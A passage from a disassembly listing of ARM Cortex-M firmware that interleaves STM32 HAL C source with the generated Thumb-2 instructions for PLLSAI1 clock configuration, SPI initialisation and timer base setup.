#if defined(RCC_PLLSAI1M_DIV_1_16_SUPPORT)
      /* Set PLLSAI1 clock source */
      MODIFY_REG(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC, PllSai1->PLLSAI1Source);
#else
      /* Set PLLSAI1 clock source and divider M */
      MODIFY_REG(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC | RCC_PLLCFGR_PLLM, PllSai1->PLLSAI1Source | (PllSai1->PLLSAI1M - 1U) << RCC_PLLCFGR_PLLM_Pos);
 8004c2e:	4b49      	ldr	r3, [pc, #292]	; (8004d54 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c30:	68db      	ldr	r3, [r3, #12]
 8004c32:	f023 0273 	bic.w	r2, r3, #115	; 0x73
 8004c36:	687b      	ldr	r3, [r7, #4]
 8004c38:	6819      	ldr	r1, [r3, #0]
 8004c3a:	687b      	ldr	r3, [r7, #4]
 8004c3c:	685b      	ldr	r3, [r3, #4]
 8004c3e:	3b01      	subs	r3, #1
 8004c40:	011b      	lsls	r3, r3, #4
 8004c42:	430b      	orrs	r3, r1
 8004c44:	4943      	ldr	r1, [pc, #268]	; (8004d54 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c46:	4313      	orrs	r3, r2
 8004c48:	60cb      	str	r3, [r1, #12]
#endif
    }
  }

  if(status == HAL_OK)
 8004c4a:	7bfb      	ldrb	r3, [r7, #15]
 8004c4c:	2b00      	cmp	r3, #0
 8004c4e:	d17c      	bne.n	8004d4a <RCCEx_PLLSAI1_Config+0x1d6>
  {
    /* Disable the PLLSAI1 */
    __HAL_RCC_PLLSAI1_DISABLE();
 8004c50:	4b40      	ldr	r3, [pc, #256]	; (8004d54 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c52:	681b      	ldr	r3, [r3, #0]
 8004c54:	4a3f      	ldr	r2, [pc, #252]	; (8004d54 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c56:	f023 6380 	bic.w	r3, r3, #67108864	; 0x4000000
 8004c5a:	6013      	str	r3, [r2, #0]

    /* Get Start Tick*/
    tickstart = HAL_GetTick();
 8004c5c:	f7fc fbc8 	bl	80013f0 <HAL_GetTick>
 8004c60:	60b8      	str	r0, [r7, #8]

    /* Wait till PLLSAI1 is ready to be updated */
    while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) != 0U)
 8004c62:	e009      	b.n	8004c78 <RCCEx_PLLSAI1_Config+0x104>
    {
      if((HAL_GetTick() - tickstart) > PLLSAI1_TIMEOUT_VALUE)
 8004c64:	f7fc fbc4 	bl	80013f0 <HAL_GetTick>
 8004c68:	4602      	mov	r2, r0
 8004c6a:	68bb      	ldr	r3, [r7, #8]
 8004c6c:	1ad3      	subs	r3, r2, r3
 8004c6e:	2b02      	cmp	r3, #2
 8004c70:	d902      	bls.n	8004c78 <RCCEx_PLLSAI1_Config+0x104>
      {
        status = HAL_TIMEOUT;
 8004c72:	2303      	movs	r3, #3
 8004c74:	73fb      	strb	r3, [r7, #15]
        break;
 8004c76:	e005      	b.n	8004c84 <RCCEx_PLLSAI1_Config+0x110>
    while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) != 0U)
 8004c78:	4b36      	ldr	r3, [pc, #216]	; (8004d54 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c7a:	681b      	ldr	r3, [r3, #0]
 8004c7c:	f003 6300 	and.w	r3, r3, #134217728	; 0x8000000
 8004c80:	2b00      	cmp	r3, #0
 8004c82:	d1ef      	bne.n	8004c64 <RCCEx_PLLSAI1_Config+0xf0>
      }
    }

    if(status == HAL_OK)
 8004c84:	7bfb      	ldrb	r3, [r7, #15]
 8004c86:	2b00      	cmp	r3, #0
 8004c88:	d15f      	bne.n	8004d4a <RCCEx_PLLSAI1_Config+0x1d6>
    {
      if(Divider == DIVIDER_P_UPDATE)
 8004c8a:	683b      	ldr	r3, [r7, #0]
 8004c8c:	2b00      	cmp	r3, #0
 8004c8e:	d110      	bne.n	8004cb2 <RCCEx_PLLSAI1_Config+0x13e>
#endif /* RCC_PLLSAI1P_DIV_2_31_SUPPORT */

#else
        /* Configure the PLLSAI1 Division factor P and Multiplication factor N*/
#if defined(RCC_PLLSAI1P_DIV_2_31_SUPPORT)
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004c90:	4b30      	ldr	r3, [pc, #192]	; (8004d54 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c92:	691b      	ldr	r3, [r3, #16]
 8004c94:	f023 4378 	bic.w	r3, r3, #4160749568	; 0xf8000000
 8004c98:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004c9c:	687a      	ldr	r2, [r7, #4]
 8004c9e:	6892      	ldr	r2, [r2, #8]
 8004ca0:	0211      	lsls	r1, r2, #8
 8004ca2:	687a      	ldr	r2, [r7, #4]
 8004ca4:	68d2      	ldr	r2, [r2, #12]
 8004ca6:	06d2      	lsls	r2, r2, #27
 8004ca8:	430a      	orrs	r2, r1
 8004caa:	492a      	ldr	r1, [pc, #168]	; (8004d54 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004cac:	4313      	orrs	r3, r2
 8004cae:	610b      	str	r3, [r1, #16]
 8004cb0:	e027      	b.n	8004d02 <RCCEx_PLLSAI1_Config+0x18e>
                   ((PllSai1->PLLSAI1P >> 4U) << RCC_PLLSAI1CFGR_PLLSAI1P_Pos));
#endif /* RCC_PLLSAI1P_DIV_2_31_SUPPORT */

#endif /* RCC_PLLSAI1M_DIV_1_16_SUPPORT */
      }
      else if(Divider == DIVIDER_Q_UPDATE)
 8004cb2:	683b      	ldr	r3, [r7, #0]
 8004cb4:	2b01      	cmp	r3, #1
 8004cb6:	d112      	bne.n	8004cde <RCCEx_PLLSAI1_Config+0x16a>
                   (PllSai1->PLLSAI1N << RCC_PLLSAI1CFGR_PLLSAI1N_Pos) |
                   (((PllSai1->PLLSAI1Q >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1Q_Pos) |
                   ((PllSai1->PLLSAI1M - 1U) << RCC_PLLSAI1CFGR_PLLSAI1M_Pos));
#else
        /* Configure the PLLSAI1 Division factor Q and Multiplication factor N*/
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004cb8:	4b26      	ldr	r3, [pc, #152]	; (8004d54 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004cba:	691b      	ldr	r3, [r3, #16]
 8004cbc:	f423 03c0 	bic.w	r3, r3, #6291456	; 0x600000
 8004cc0:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004cc4:	687a      	ldr	r2, [r7, #4]
 8004cc6:	6892      	ldr	r2, [r2, #8]
 8004cc8:	0211      	lsls	r1, r2, #8
 8004cca:	687a      	ldr	r2, [r7, #4]
 8004ccc:	6912      	ldr	r2, [r2, #16]
 8004cce:	0852      	lsrs	r2, r2, #1
 8004cd0:	3a01      	subs	r2, #1
 8004cd2:	0552      	lsls	r2, r2, #21
 8004cd4:	430a      	orrs	r2, r1
 8004cd6:	491f      	ldr	r1, [pc, #124]	; (8004d54 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004cd8:	4313      	orrs	r3, r2
 8004cda:	610b      	str	r3, [r1, #16]
 8004cdc:	e011      	b.n	8004d02 <RCCEx_PLLSAI1_Config+0x18e>
                   (PllSai1->PLLSAI1N << RCC_PLLSAI1CFGR_PLLSAI1N_Pos) |
                   (((PllSai1->PLLSAI1R >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1R_Pos) |
                   ((PllSai1->PLLSAI1M - 1U) << RCC_PLLSAI1CFGR_PLLSAI1M_Pos));
#else
        /* Configure the PLLSAI1 Division factor R and Multiplication factor N*/
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004cde:	4b1d      	ldr	r3, [pc, #116]	; (8004d54 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004ce0:	691b      	ldr	r3, [r3, #16]
 8004ce2:	f023 63c0 	bic.w	r3, r3, #100663296	; 0x6000000
 8004ce6:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004cea:	687a      	ldr	r2, [r7, #4]
 8004cec:	6892      	ldr	r2, [r2, #8]
 8004cee:	0211      	lsls	r1, r2, #8
 8004cf0:	687a      	ldr	r2, [r7, #4]
 8004cf2:	6952      	ldr	r2, [r2, #20]
 8004cf4:	0852      	lsrs	r2, r2, #1
 8004cf6:	3a01      	subs	r2, #1
 8004cf8:	0652      	lsls	r2, r2, #25
 8004cfa:	430a      	orrs	r2, r1
 8004cfc:	4915      	ldr	r1, [pc, #84]	; (8004d54 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004cfe:	4313      	orrs	r3, r2
 8004d00:	610b      	str	r3, [r1, #16]
                   (((PllSai1->PLLSAI1R >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1R_Pos));
#endif /* RCC_PLLSAI1M_DIV_1_16_SUPPORT */
      }

      /* Enable the PLLSAI1 again by setting PLLSAI1ON to 1*/
      __HAL_RCC_PLLSAI1_ENABLE();
 8004d02:	4b14      	ldr	r3, [pc, #80]	; (8004d54 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004d04:	681b      	ldr	r3, [r3, #0]
 8004d06:	4a13      	ldr	r2, [pc, #76]	; (8004d54 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004d08:	f043 6380 	orr.w	r3, r3, #67108864	; 0x4000000
 8004d0c:	6013      	str	r3, [r2, #0]

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8004d0e:	f7fc fb6f 	bl	80013f0 <HAL_GetTick>
 8004d12:	60b8      	str	r0, [r7, #8]

      /* Wait till PLLSAI1 is ready */
      while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) == 0U)
 8004d14:	e009      	b.n	8004d2a <RCCEx_PLLSAI1_Config+0x1b6>
      {
        if((HAL_GetTick() - tickstart) > PLLSAI1_TIMEOUT_VALUE)
 8004d16:	f7fc fb6b 	bl	80013f0 <HAL_GetTick>
 8004d1a:	4602      	mov	r2, r0
 8004d1c:	68bb      	ldr	r3, [r7, #8]
 8004d1e:	1ad3      	subs	r3, r2, r3
 8004d20:	2b02      	cmp	r3, #2
 8004d22:	d902      	bls.n	8004d2a <RCCEx_PLLSAI1_Config+0x1b6>
        {
          status = HAL_TIMEOUT;
 8004d24:	2303      	movs	r3, #3
 8004d26:	73fb      	strb	r3, [r7, #15]
          break;
 8004d28:	e005      	b.n	8004d36 <RCCEx_PLLSAI1_Config+0x1c2>
      while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) == 0U)
 8004d2a:	4b0a      	ldr	r3, [pc, #40]	; (8004d54 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004d2c:	681b      	ldr	r3, [r3, #0]
 8004d2e:	f003 6300 	and.w	r3, r3, #134217728	; 0x8000000
 8004d32:	2b00      	cmp	r3, #0
 8004d34:	d0ef      	beq.n	8004d16 <RCCEx_PLLSAI1_Config+0x1a2>
        }
      }

      if(status == HAL_OK)
 8004d36:	7bfb      	ldrb	r3, [r7, #15]
 8004d38:	2b00      	cmp	r3, #0
 8004d3a:	d106      	bne.n	8004d4a <RCCEx_PLLSAI1_Config+0x1d6>
      {
        /* Configure the PLLSAI1 Clock output(s) */
        __HAL_RCC_PLLSAI1CLKOUT_ENABLE(PllSai1->PLLSAI1ClockOut);
 8004d3c:	4b05      	ldr	r3, [pc, #20]	; (8004d54 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004d3e:	691a      	ldr	r2, [r3, #16]
 8004d40:	687b      	ldr	r3, [r7, #4]
 8004d42:	699b      	ldr	r3, [r3, #24]
 8004d44:	4903      	ldr	r1, [pc, #12]	; (8004d54 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004d46:	4313      	orrs	r3, r2
 8004d48:	610b      	str	r3, [r1, #16]
      }
    }
  }

  return status;
 8004d4a:	7bfb      	ldrb	r3, [r7, #15]
}
 8004d4c:	4618      	mov	r0, r3
 8004d4e:	3710      	adds	r7, #16
 8004d50:	46bd      	mov	sp, r7
 8004d52:	bd80      	pop	{r7, pc}
 8004d54:	40021000 	.word	0x40021000

08004d58 <HAL_SPI_Init>:
  * @param  hspi pointer to a SPI_HandleTypeDef structure that contains
  *               the configuration information for SPI module.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_SPI_Init(SPI_HandleTypeDef *hspi)
{
 8004d58:	b580      	push	{r7, lr}
 8004d5a:	b084      	sub	sp, #16
 8004d5c:	af00      	add	r7, sp, #0
 8004d5e:	6078      	str	r0, [r7, #4]
  uint32_t frxth;

  /* Check the SPI handle allocation */
  if (hspi == NULL)
 8004d60:	687b      	ldr	r3, [r7, #4]
 8004d62:	2b00      	cmp	r3, #0
 8004d64:	d101      	bne.n	8004d6a <HAL_SPI_Init+0x12>
  {
    return HAL_ERROR;
 8004d66:	2301      	movs	r3, #1
 8004d68:	e095      	b.n	8004e96 <HAL_SPI_Init+0x13e>
  assert_param(IS_SPI_NSS(hspi->Init.NSS));
  assert_param(IS_SPI_NSSP(hspi->Init.NSSPMode));
  assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));
  assert_param(IS_SPI_FIRST_BIT(hspi->Init.FirstBit));
  assert_param(IS_SPI_TIMODE(hspi->Init.TIMode));
  if (hspi->Init.TIMode == SPI_TIMODE_DISABLE)
 8004d6a:	687b      	ldr	r3, [r7, #4]
 8004d6c:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004d6e:	2b00      	cmp	r3, #0
 8004d70:	d108      	bne.n	8004d84 <HAL_SPI_Init+0x2c>
  {
    assert_param(IS_SPI_CPOL(hspi->Init.CLKPolarity));
    assert_param(IS_SPI_CPHA(hspi->Init.CLKPhase));

    if (hspi->Init.Mode == SPI_MODE_MASTER)
 8004d72:	687b      	ldr	r3, [r7, #4]
 8004d74:	685b      	ldr	r3, [r3, #4]
 8004d76:	f5b3 7f82 	cmp.w	r3, #260	; 0x104
 8004d7a:	d009      	beq.n	8004d90 <HAL_SPI_Init+0x38>
      assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));
    }
    else
    {
      /* Baudrate prescaler not use in Motoraola Slave mode. force to default value */
      hspi->Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_2;
 8004d7c:	687b      	ldr	r3, [r7, #4]
 8004d7e:	2200      	movs	r2, #0
 8004d80:	61da      	str	r2, [r3, #28]
 8004d82:	e005      	b.n	8004d90 <HAL_SPI_Init+0x38>
  else
  {
    assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));

    /* Force polarity and phase to TI protocaol requirements */
    hspi->Init.CLKPolarity = SPI_POLARITY_LOW;
 8004d84:	687b      	ldr	r3, [r7, #4]
 8004d86:	2200      	movs	r2, #0
 8004d88:	611a      	str	r2, [r3, #16]
    hspi->Init.CLKPhase    = SPI_PHASE_1EDGE;
 8004d8a:	687b      	ldr	r3, [r7, #4]
 8004d8c:	2200      	movs	r2, #0
 8004d8e:	615a      	str	r2, [r3, #20]
  {
    assert_param(IS_SPI_CRC_POLYNOMIAL(hspi->Init.CRCPolynomial));
    assert_param(IS_SPI_CRC_LENGTH(hspi->Init.CRCLength));
  }
#else
  hspi->Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8004d90:	687b      	ldr	r3, [r7, #4]
 8004d92:	2200      	movs	r2, #0
 8004d94:	629a      	str	r2, [r3, #40]	; 0x28
#endif /* USE_SPI_CRC */

  if (hspi->State == HAL_SPI_STATE_RESET)
 8004d96:	687b      	ldr	r3, [r7, #4]
 8004d98:	f893 305d 	ldrb.w	r3, [r3, #93]	; 0x5d
 8004d9c:	b2db      	uxtb	r3, r3
 8004d9e:	2b00      	cmp	r3, #0
 8004da0:	d106      	bne.n	8004db0 <HAL_SPI_Init+0x58>
  {
    /* Allocate lock resource and initialize it */
    hspi->Lock = HAL_UNLOCKED;
 8004da2:	687b      	ldr	r3, [r7, #4]
 8004da4:	2200      	movs	r2, #0
 8004da6:	f883 205c 	strb.w	r2, [r3, #92]	; 0x5c

    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    hspi->MspInitCallback(hspi);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    HAL_SPI_MspInit(hspi);
 8004daa:	6878      	ldr	r0, [r7, #4]
 8004dac:	f7fc f8cc 	bl	8000f48 <HAL_SPI_MspInit>
#endif /* USE_HAL_SPI_REGISTER_CALLBACKS */
  }

  hspi->State = HAL_SPI_STATE_BUSY;
 8004db0:	687b      	ldr	r3, [r7, #4]
 8004db2:	2202      	movs	r2, #2
 8004db4:	f883 205d 	strb.w	r2, [r3, #93]	; 0x5d

  /* Disable the selected SPI peripheral */
  __HAL_SPI_DISABLE(hspi);
 8004db8:	687b      	ldr	r3, [r7, #4]
 8004dba:	681b      	ldr	r3, [r3, #0]
 8004dbc:	681a      	ldr	r2, [r3, #0]
 8004dbe:	687b      	ldr	r3, [r7, #4]
 8004dc0:	681b      	ldr	r3, [r3, #0]
 8004dc2:	f022 0240 	bic.w	r2, r2, #64	; 0x40
 8004dc6:	601a      	str	r2, [r3, #0]

  /* Align by default the rs fifo threshold on the data size */
  if (hspi->Init.DataSize > SPI_DATASIZE_8BIT)
 8004dc8:	687b      	ldr	r3, [r7, #4]
 8004dca:	68db      	ldr	r3, [r3, #12]
 8004dcc:	f5b3 6fe0 	cmp.w	r3, #1792	; 0x700
 8004dd0:	d902      	bls.n	8004dd8 <HAL_SPI_Init+0x80>
  {
    frxth = SPI_RXFIFO_THRESHOLD_HF;
 8004dd2:	2300      	movs	r3, #0
 8004dd4:	60fb      	str	r3, [r7, #12]
 8004dd6:	e002      	b.n	8004dde <HAL_SPI_Init+0x86>
  }
  else
  {
    frxth = SPI_RXFIFO_THRESHOLD_QF;
 8004dd8:	f44f 5380 	mov.w	r3, #4096	; 0x1000
 8004ddc:	60fb      	str	r3, [r7, #12]
  }

  /* CRC calculation is valid only for 16Bit and 8 Bit */
  if ((hspi->Init.DataSize != SPI_DATASIZE_16BIT) && (hspi->Init.DataSize != SPI_DATASIZE_8BIT))
 8004dde:	687b      	ldr	r3, [r7, #4]
 8004de0:	68db      	ldr	r3, [r3, #12]
 8004de2:	f5b3 6f70 	cmp.w	r3, #3840	; 0xf00
 8004de6:	d007      	beq.n	8004df8 <HAL_SPI_Init+0xa0>
 8004de8:	687b      	ldr	r3, [r7, #4]
 8004dea:	68db      	ldr	r3, [r3, #12]
 8004dec:	f5b3 6fe0 	cmp.w	r3, #1792	; 0x700
 8004df0:	d002      	beq.n	8004df8 <HAL_SPI_Init+0xa0>
  {
    /* CRC must be disabled */
    hspi->Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8004df2:	687b      	ldr	r3, [r7, #4]
 8004df4:	2200      	movs	r2, #0
 8004df6:	629a      	str	r2, [r3, #40]	; 0x28
  }

  /*----------------------- SPIx CR1 & CR2 Configuration ---------------------*/
  /* Configure : SPI Mode, Communication Mode, Clock polarity and phase, NSS management,
  Communication speed, First bit and CRC calculation state */
  WRITE_REG(hspi->Instance->CR1, ((hspi->Init.Mode & (SPI_CR1_MSTR | SPI_CR1_SSI)) |
 8004df8:	687b      	ldr	r3, [r7, #4]
 8004dfa:	685b      	ldr	r3, [r3, #4]
 8004dfc:	f403 7282 	and.w	r2, r3, #260	; 0x104
 8004e00:	687b      	ldr	r3, [r7, #4]
 8004e02:	689b      	ldr	r3, [r3, #8]
 8004e04:	f403 4304 	and.w	r3, r3, #33792	; 0x8400
 8004e08:	431a      	orrs	r2, r3
 8004e0a:	687b      	ldr	r3, [r7, #4]
 8004e0c:	691b      	ldr	r3, [r3, #16]
 8004e0e:	f003 0302 	and.w	r3, r3, #2
 8004e12:	431a      	orrs	r2, r3
 8004e14:	687b      	ldr	r3, [r7, #4]
 8004e16:	695b      	ldr	r3, [r3, #20]
 8004e18:	f003 0301 	and.w	r3, r3, #1
 8004e1c:	431a      	orrs	r2, r3
 8004e1e:	687b      	ldr	r3, [r7, #4]
 8004e20:	699b      	ldr	r3, [r3, #24]
 8004e22:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8004e26:	431a      	orrs	r2, r3
 8004e28:	687b      	ldr	r3, [r7, #4]
 8004e2a:	69db      	ldr	r3, [r3, #28]
 8004e2c:	f003 0338 	and.w	r3, r3, #56	; 0x38
 8004e30:	431a      	orrs	r2, r3
 8004e32:	687b      	ldr	r3, [r7, #4]
 8004e34:	6a1b      	ldr	r3, [r3, #32]
 8004e36:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004e3a:	ea42 0103 	orr.w	r1, r2, r3
 8004e3e:	687b      	ldr	r3, [r7, #4]
 8004e40:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8004e42:	f403 5200 	and.w	r2, r3, #8192	; 0x2000
 8004e46:	687b      	ldr	r3, [r7, #4]
 8004e48:	681b      	ldr	r3, [r3, #0]
 8004e4a:	430a      	orrs	r2, r1
 8004e4c:	601a      	str	r2, [r3, #0]
    }
  }
#endif /* USE_SPI_CRC */

  /* Configure : NSS management, TI Mode, NSS Pulse, Data size and Rx Fifo threshold */
  WRITE_REG(hspi->Instance->CR2, (((hspi->Init.NSS >> 16U) & SPI_CR2_SSOE) |
 8004e4e:	687b      	ldr	r3, [r7, #4]
 8004e50:	699b      	ldr	r3, [r3, #24]
 8004e52:	0c1b      	lsrs	r3, r3, #16
 8004e54:	f003 0204 	and.w	r2, r3, #4
 8004e58:	687b      	ldr	r3, [r7, #4]
 8004e5a:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004e5c:	f003 0310 	and.w	r3, r3, #16
 8004e60:	431a      	orrs	r2, r3
 8004e62:	687b      	ldr	r3, [r7, #4]
 8004e64:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 8004e66:	f003 0308 	and.w	r3, r3, #8
 8004e6a:	431a      	orrs	r2, r3
 8004e6c:	687b      	ldr	r3, [r7, #4]
 8004e6e:	68db      	ldr	r3, [r3, #12]
 8004e70:	f403 6370 	and.w	r3, r3, #3840	; 0xf00
 8004e74:	ea42 0103 	orr.w	r1, r2, r3
 8004e78:	68fb      	ldr	r3, [r7, #12]
 8004e7a:	f403 5280 	and.w	r2, r3, #4096	; 0x1000
 8004e7e:	687b      	ldr	r3, [r7, #4]
 8004e80:	681b      	ldr	r3, [r3, #0]
 8004e82:	430a      	orrs	r2, r1
 8004e84:	605a      	str	r2, [r3, #4]
#if defined(SPI_I2SCFGR_I2SMOD)
  /* Activate the SPI mode (Make sure that I2SMOD bit in I2SCFGR register is reset) */
  CLEAR_BIT(hspi->Instance->I2SCFGR, SPI_I2SCFGR_I2SMOD);
#endif /* SPI_I2SCFGR_I2SMOD */

  hspi->ErrorCode = HAL_SPI_ERROR_NONE;
 8004e86:	687b      	ldr	r3, [r7, #4]
 8004e88:	2200      	movs	r2, #0
 8004e8a:	661a      	str	r2, [r3, #96]	; 0x60
  hspi->State     = HAL_SPI_STATE_READY;
 8004e8c:	687b      	ldr	r3, [r7, #4]
 8004e8e:	2201      	movs	r2, #1
 8004e90:	f883 205d 	strb.w	r2, [r3, #93]	; 0x5d

  return HAL_OK;
 8004e94:	2300      	movs	r3, #0
}
 8004e96:	4618      	mov	r0, r3
 8004e98:	3710      	adds	r7, #16
 8004e9a:	46bd      	mov	sp, r7
 8004e9c:	bd80      	pop	{r7, pc}

08004e9e <HAL_TIM_Base_Init>:
  *         Ex: call @ref HAL_TIM_Base_DeInit() before HAL_TIM_Base_Init()
  * @param  htim TIM Base handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_Base_Init(TIM_HandleTypeDef *htim)
{
 8004e9e:	b580      	push	{r7, lr}
 8004ea0:	b082      	sub	sp, #8
 8004ea2:	af00      	add	r7, sp, #0
 8004ea4:	6078      	str	r0, [r7, #4]
  /* Check the TIM handle allocation */
  if (htim == NULL)
 8004ea6:	687b      	ldr	r3, [r7, #4]
 8004ea8:	2b00      	cmp	r3, #0
 8004eaa:	d101      	bne.n	8004eb0 <HAL_TIM_Base_Init+0x12>
  {
    return HAL_ERROR;
 8004eac:	2301      	movs	r3, #1
 8004eae:	e049      	b.n	8004f44 <HAL_TIM_Base_Init+0xa6>
  assert_param(IS_TIM_COUNTER_MODE(htim->Init.CounterMode));
  assert_param(IS_TIM_CLOCKDIVISION_DIV(htim->Init.ClockDivision));
  assert_param(IS_TIM_PERIOD(htim, htim->Init.Period));
  assert_param(IS_TIM_AUTORELOAD_PRELOAD(htim->Init.AutoReloadPreload));

  if (htim->State == HAL_TIM_STATE_RESET)
 8004eb0:	687b      	ldr	r3, [r7, #4]
 8004eb2:	f893 303d 	ldrb.w	r3, [r3, #61]	; 0x3d
 8004eb6:	b2db      	uxtb	r3, r3
 8004eb8:	2b00      	cmp	r3, #0
 8004eba:	d106      	bne.n	8004eca <HAL_TIM_Base_Init+0x2c>
  {
    /* Allocate lock resource and initialize it */
    htim->Lock = HAL_UNLOCKED;
 8004ebc:	687b      	ldr	r3, [r7, #4]
 8004ebe:	2200      	movs	r2, #0
 8004ec0:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c
    }
    /* Init the low level hardware : GPIO, CLOCK, NVIC */
    htim->Base_MspInitCallback(htim);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC */
    HAL_TIM_Base_MspInit(htim);
 8004ec4:	6878      	ldr	r0, [r7, #4]
 8004ec6:	f7fc f943 	bl	8001150 <HAL_TIM_Base_MspInit>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
  }

  /* Set the TIM state */
  htim->State = HAL_TIM_STATE_BUSY;
 8004eca:	687b      	ldr	r3, [r7, #4]
 8004ecc:	2202      	movs	r2, #2
 8004ece:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Set the Time Base configuration */
  TIM_Base_SetConfig(htim->Instance, &htim->Init);
 8004ed2:	687b      	ldr	r3, [r7, #4]
 8004ed4:	681a      	ldr	r2, [r3, #0]
 8004ed6:	687b      	ldr	r3, [r7, #4]
 8004ed8:	3304      	adds	r3, #4
 8004eda:	4619      	mov	r1, r3
 8004edc:	4610      	mov	r0, r2
 8004ede:	f000 fa7d 	bl	80053dc <TIM_Base_SetConfig>

  /* Initialize the DMA burst operation state */
  htim->DMABurstState = HAL_DMA_BURST_STATE_READY;
 8004ee2:	687b      	ldr	r3, [r7, #4]
 8004ee4:	2201      	movs	r2, #1
 8004ee6:	f883 2048 	strb.w	r2, [r3, #72]	; 0x48

  /* Initialize the TIM channels state */
  TIM_CHANNEL_STATE_SET_ALL(htim, HAL_TIM_CHANNEL_STATE_READY);
 8004eea:	687b      	ldr	r3, [r7, #4]
 8004eec:	2201      	movs	r2, #1
 8004eee:	f883 203e 	strb.w	r2, [r3, #62]	; 0x3e
 8004ef2:	687b      	ldr	r3, [r7, #4]
 8004ef4:	2201      	movs	r2, #1
 8004ef6:	f883 203f 	strb.w	r2, [r3, #63]	; 0x3f
 8004efa:	687b      	ldr	r3, [r7, #4]
 8004efc:	2201      	movs	r2, #1
 8004efe:	f883 2040 	strb.w	r2, [r3, #64]	; 0x40
 8004f02:	687b      	ldr	r3, [r7, #4]
 8004f04:	2201      	movs	r2, #1
 8004f06:	f883 2041 	strb.w	r2, [r3, #65]	; 0x41
 8004f0a:	687b      	ldr	r3, [r7, #4]
 8004f0c:	2201      	movs	r2, #1
 8004f0e:	f883 2042 	strb.w	r2, [r3, #66]	; 0x42
 8004f12:	687b      	ldr	r3, [r7, #4]
 8004f14:	2201      	movs	r2, #1
 8004f16:	f883 2043 	strb.w	r2, [r3, #67]	; 0x43
  TIM_CHANNEL_N_STATE_SET_ALL(htim, HAL_TIM_CHANNEL_STATE_READY);
 8004f1a:	687b      	ldr	r3, [r7, #4]
 8004f1c:	2201      	movs	r2, #1
 8004f1e:	f883 2044 	strb.w	r2, [r3, #68]	; 0x44
 8004f22:	687b      	ldr	r3, [r7, #4]
 8004f24:	2201      	movs	r2, #1
 8004f26:	f883 2045 	strb.w	r2, [r3, #69]	; 0x45
 8004f2a:	687b      	ldr	r3, [r7, #4]
 8004f2c:	2201      	movs	r2, #1
 8004f2e:	f883 2046 	strb.w	r2, [r3, #70]	; 0x46
 8004f32:	687b      	ldr	r3, [r7, #4]
 8004f34:	2201      	movs	r2, #1
 8004f36:	f883 2047 	strb.w	r2, [r3, #71]	; 0x47

  /* Initialize the TIM state*/
  htim->State = HAL_TIM_STATE_READY;
 8004f3a:	687b      	ldr	r3, [r7, #4]
 8004f3c:	2201      	movs	r2, #1
 8004f3e:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  return HAL_OK;
 8004f42:	2300      	movs	r3, #0
}
 8004f44:	4618      	mov	r0, r3
 8004f46:	3708      	adds	r7, #8
 8004f48:	46bd      	mov	sp, r7
 8004f4a:	bd80      	pop	{r7, pc}

08004f4c <HAL_TIM_Base_Start_IT>:
  * @brief  Starts the TIM Base generation in interrupt mode.
  * @param  htim TIM Base handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_Base_Start_IT(TIM_HandleTypeDef *htim)
{
 8004f4c:	b480      	push	{r7}
 8004f4e:	b085      	sub	sp, #20
 8004f50:	af00      	add	r7, sp, #0
 8004f52:	6078      	str	r0, [r7, #4]

  /* Check the parameters */
  assert_param(IS_TIM_INSTANCE(htim->Instance));

  /* Check the TIM state */
  if (htim->State != HAL_TIM_STATE_READY)
 8004f54:	687b      	ldr	r3, [r7, #4]
 8004f56:	f893 303d 	ldrb.w	r3, [r3, #61]	; 0x3d
 8004f5a:	b2db      	uxtb	r3, r3
 8004f5c:	2b01      	cmp	r3, #1
